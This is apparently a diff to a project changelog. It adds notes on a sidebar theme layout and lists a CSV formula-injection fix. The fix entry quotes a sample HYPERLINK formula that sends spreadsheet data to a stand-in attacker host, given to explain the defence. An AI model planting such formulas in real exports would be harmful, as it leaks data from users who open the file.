@@ -116,6 +116,17 @@
 - [x] Verified by visual regression — 65/65 baselines pass with zero pixel diff (escaping CJK + emoji is byte-identical)
 - See `docs/SECURITY.md` for the complete escape convention + threat model
 
+### Phase 2.5 — Linear Sidebar Layout (100%) 🆕
+- [x] `themeManager.mount()` now unmounts the previous theme's layout before swapping — prevents DOM leak when switching from Linear (sidebar) → Broadcast/Trading/Atelier
+- [x] `linear/index.js` ships a real `layout.mount/unmount` that moves the live `<nav class="topnav">` into a new `<aside class="linear-sidebar">` wrapper (move-not-clone preserves event listeners + the `#themePickerMount` slot)
+- [x] CSS-only mobile fallback: `display: contents` on the sidebar wrapper at `@media (max-width: 768px)` — children render in normal flow, topnav reverts to default sticky-top row, no JS resize listener needed
+- [x] `linear/featureManifest.js` declares `navigation: 'sidebar'`
+- [x] State preservation is structural — `state.js` singleton survives DOM mutations; the architecture-doc `getSnapshot/restore` pseudocode was illustrative, not literal
+- [x] 20-assertion smoke test `scripts/visual/test-theme-switch.mjs` verifies mount + unmount + remount + state-survival across 4-theme cycle (broadcast → trading → atelier → linear)
+- [x] VR baselines regenerated for Linear desktop (sidebar visible in `phase2-linear/*.png`)
+- See `docs/design/THEME-ARCHITECTURE.md` Section 7 row "2.5" for full implementation notes
+- **Deferred (Phase 2.6, open-ended)**: demo-grade multi-section sidebar with status indicators per `demos/demo-linear-v2.png` — current implementation is minimal-but-real (mirrors topnav into vertical rail)
+
 ### CSV Formula-Injection Protection (100%) 🆕
 - [x] `csvEscape` in `src/export/exportHandlers.js` prefixes formula-trigger cells (`=`, `+`, `-`, `@`, `\t`, `\r`) with single quote — OWASP-recommended approach (2026-05-05 `86d2813`)
 - [x] Closes vector where a malicious `displayName` like `=HYPERLINK("//evil.com/?x="&A1,"Click")` would execute as a live formula when teammates open the CSV in Excel / Numbers / LibreOffice
